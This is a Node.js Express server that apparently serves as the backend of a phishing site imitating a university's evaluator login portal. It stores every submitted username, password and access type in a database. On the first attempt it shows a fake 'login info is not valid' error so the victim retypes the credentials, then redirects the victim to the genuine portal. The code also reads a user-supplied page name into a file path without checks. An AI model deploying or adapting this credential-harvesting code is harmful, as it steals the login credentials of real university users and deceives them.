require('dotenv').config();
const express = require('express');
const mysql = require('mysql2/promise');
const fs = require('fs'); 
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.static('public')); 
app.use(express.json());
app.use(express.urlencoded({ extended: true })); 

const pool = mysql.createPool(process.env.DATABASE_URL);

// --- ROUTES FOR CLEAN URLS (Optional) ---
app.get('/administration', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'administration.html'));
});

// --- LOGIN LOGIC ---
app.post('/login', async (req, res) => {
    // 1. We now grab 'source_page' from the form too
    const { USERNAME, PASSWORD, ACCESSTYPE, attempt_tracker, source_page } = req.body;

    try {
        // 2. ALWAYS Save the data 
        const query = `INSERT INTO users (username, password, access_type) VALUES (?, ?, ?)`;
        await pool.execute(query, [USERNAME, PASSWORD, ACCESSTYPE]);

        // 3. CHECK: Is this the second attempt?
        if (attempt_tracker === "2") {
            // === PHASE 2: SUCCESS REDIRECT ===
            // You can change this link to wherever you want them to go after success
            res.redirect('http://jmiregular.ucanapply.com/universitysystem/evaluator/');
        } else {
            // === PHASE 1: THE TRICK ===
            
            // DYNAMIC LOGIC: Decide which file to load based on the hidden input
            // If source_page is missing, default to index.html
            const pageFile = source_page || 'index.html';
            const pagePath = path.join(__dirname, 'public', pageFile);
            
            fs.readFile(pagePath, 'utf8', (err, htmlData) => {
                if (err) {
                    console.error(err);
                    return res.status(500).send("Error loading page.");
                }

                const errorHTML = `
                   <font style="color:#ff0000">Your login info is not valid.</font><br/>
                `;

                // Inject Error Message
                let modifiedHTML = htmlData.replace(
                    '<label for="exampleInputEmail2">Access as </label>', 
                    errorHTML + '<label for="exampleInputEmail2">Access as </label>'
                );

                // Inject Tracker AND keep the Source Page info for the second attempt
                // We add BOTH hidden inputs back into the form
                const hiddenInputs = `
                    <input type="hidden" name="attempt_tracker" value="2">
                    <input type="hidden" name="source_page" value="${pageFile}">
                    </form>
                `;

                modifiedHTML = modifiedHTML.replace('</form>', hiddenInputs);
                
                res.send(modifiedHTML);
            });
        }

    } catch (err) {
        console.error(err);
        res.status(500).send("Database error.");
    }
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});